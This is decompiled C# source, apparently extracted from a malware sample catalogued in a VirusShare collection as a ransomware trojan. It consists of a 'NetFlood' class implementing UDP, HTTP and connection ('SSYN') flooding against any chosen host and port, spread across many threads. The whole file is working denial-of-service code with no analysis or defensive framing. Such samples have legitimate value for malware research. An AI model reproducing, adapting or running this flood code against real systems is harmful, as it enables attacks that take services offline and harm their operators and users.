// Decompiled with JetBrains decompiler
// Type: Ddoser.NetFlood
// Assembly: ddoser, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DBD3E2AF-FDB2-4702-A8E4-49D228050DB9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.slb-0388ac822d60fc5839fa126fb5f03368fb0534743db3a84fc0a0bc40813350f0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Ddoser
{
  public class NetFlood
  {
    private Random R;

    public NetFlood() => this.R = new Random();

    public bool IsFlooding { get; set; }

    public void StartUdp(string fIP, int fPort) => this.StartUdp(fIP, fPort, 35, 100);

    public void StartUdp(string fIP, int fPort, int Sockets) => this.StartUdp(fIP, fPort, Sockets, 100);

    public void StartUdp(string fIP, int fPort, int Sockets, int Interval)
    {
      this.IsFlooding = true;
      int num1 = Sockets;
      int num2 = 1;
      while (num2 <= num1)
      {
        ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.SendUdp((object[]) a0)), (object) new object[3]
        {
          (object) fIP,
          (object) fPort,
          (object) Interval
        });
        checked { ++num2; }
      }
    }

    public void StartHttp(string host) => this.StartHttp(host, 35, 100);

    public void StartHttp(string host, int sockets) => this.StartHttp(host, sockets, 100);

    public void StartHttp(string host, int sockets, int interval)
    {
      this.IsFlooding = true;
      int num1 = sockets;
      int num2 = 1;
      while (num2 <= num1)
      {
        ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.SendHttp((object[]) a0)), (object) new object[2]
        {
          (object) interval,
          (object) host
        });
        checked { ++num2; }
      }
    }

    public void StartSSYN(string fip, int fport) => this.StartSSYN(fip, fport, 35, 100);

    public void StartSSYN(string fip, int fport, int sockets) => this.StartSSYN(fip, fport, sockets, 100);

    public void StartSSYN(string fip, int fport, int sockets, int interval)
    {
      this.IsFlooding = true;
      int num1 = sockets;
      int num2 = 1;
      while (num2 <= num1)
      {
        ThreadPool.QueueUserWorkItem((WaitCallback) (a0 => this.SendSSYN((object[]) a0)), (object) new object[3]
        {
          (object) fip,
          (object) fport,
          (object) interval
        });
        checked { ++num2; }
      }
    }

    public void StopFloods() => this.IsFlooding = false;

    private void SendUdp(object[] obj)
    {
      string str = Conversions.ToString(obj[0]);
      int integer1 = Conversions.ToInteger(obj[1]);
      int integer2 = Conversions.ToInteger(obj[2]);
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
      IPAddress address = IPAddress.None;
      if (!IPAddress.TryParse(str, out address))
        str = Dns.GetHostEntry(str).AddressList[0].ToString();
      socket.Connect(str, integer1);
      byte[] buffer = new byte[65508];
      this.R.NextBytes(buffer);
      while (this.IsFlooding)
      {
        try
        {
          socket.Send(buffer, buffer.Length, SocketFlags.None);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(integer2);
      }
    }

    private void SendHttp(object[] obj)
    {
      int integer = Conversions.ToInteger(obj[0]);
      string str = Conversions.ToString(obj[1]);
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      IPAddress address = IPAddress.None;
      if (!IPAddress.TryParse(str, out address))
        str = Dns.GetHostEntry(str).AddressList[0].ToString();
      while (this.IsFlooding)
      {
        try
        {
          socket.Connect(str, 80);
          socket.Send(Encoding.GetEncoding(1252).GetBytes("GET /"));
          socket.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          socket.Close();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(integer);
      }
    }

    private void SendSSYN(object[] obj)
    {
      string str = Conversions.ToString(obj[0]);
      int integer = Conversions.ToInteger(obj[1]);
      Conversions.ToInteger(obj[2]);
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      IPAddress address = IPAddress.None;
      if (!IPAddress.TryParse(str, out address))
        str = Dns.GetHostEntry(str).AddressList[0].ToString();
      while (true)
      {
        try
        {
          socket.BeginConnect(str, integer, new AsyncCallback(this.SSYNCallback), (object) null);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          socket.Close();
          ProjectData.ClearProjectError();
        }
      }
    }

    private void SSYNCallback(IAsyncResult ar)
    {
    }
  }
}
